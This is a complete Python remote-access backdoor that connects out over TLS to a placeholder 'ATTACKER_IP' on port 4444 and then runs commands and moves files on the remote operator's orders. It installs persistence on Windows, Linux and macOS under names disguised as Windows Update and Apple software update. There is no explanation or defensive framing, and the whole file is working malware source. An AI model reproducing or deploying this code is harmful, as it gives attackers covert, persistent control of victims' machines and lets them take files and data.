#!/usr/bin/env python3
import base64
import json
import os
import socket
import subprocess
import sys
import ssl
import platform
import getpass
from Crypto.Cipher import AES  # For additional encryption (optional)

class Backdoor:
    def __init__(self, ip, port, password):
        self.password = password
        self.connection = self._secure_connect(ip, port)
        self._install_persistence()

    def _secure_connect(self, ip, port):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        secure_socket = context.wrap_socket(raw_socket)
        secure_socket.connect((ip, port))
        return secure_socket

    def _install_persistence(self):
        if platform.system() == "Windows":
            self._windows_persistence()
        elif platform.system() == "Linux":
            self._linux_persistence()
        elif platform.system() == "Darwin":
            self._macos_persistence()

    def _windows_persistence(self):
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
            winreg.CloseKey(key)
        except Exception as e:
            pass

    def _linux_persistence(self):
        cron_job = f"@reboot {sys.executable} {os.path.abspath(__file__)}\n"
        cron_file = f"/tmp/cron_{getpass.getuser()}"
        with open(cron_file, "w") as f:
            f.write(cron_job)
        subprocess.call(f"crontab {cron_file}", shell=True)
        os.remove(cron_file)

    def _macos_persistence(self):
        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.apple.softwareupdate</string>
            <key>ProgramArguments</key>
            <array>
                <string>{sys.executable}</string>
                <string>{os.path.abspath(__file__)}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>"""
        plist_path = f"/Users/{getpass.getuser()}/Library/LaunchAgents/com.apple.softwareupdate.plist"
        with open(plist_path, "w") as f:
            f.write(plist)
        subprocess.call(f"launchctl load {plist_path}", shell=True)

    def execute_system_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode('utf-8', errors='replace')
        except subprocess.CalledProcessError as e:
            return f"Command failed: {e.output.decode('utf-8', errors='replace')}"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
        return f"Uploaded to {path}"

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    break
                json_data += chunk
                return json.loads(json_data.decode())
            except (ValueError, json.JSONDecodeError):
                continue

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                sys.exit(0)
            elif command[0] == "cd" and len(command) > 1:
                os.chdir(command[1])
                result = f"Changed directory to {os.getcwd()}"
            elif command[0] == "download":
                result = self.read_file(command[1])
            elif command[0] == "upload":
                result = self.write_file(command[1], command[2])
            else:
                result = self.execute_system_command(command)
            self.reliable_send(result)

if __name__ == "__main__":
    my_backdoor = Backdoor("ATTACKER_IP", 4444, "PASSWORD")
    my_backdoor.run()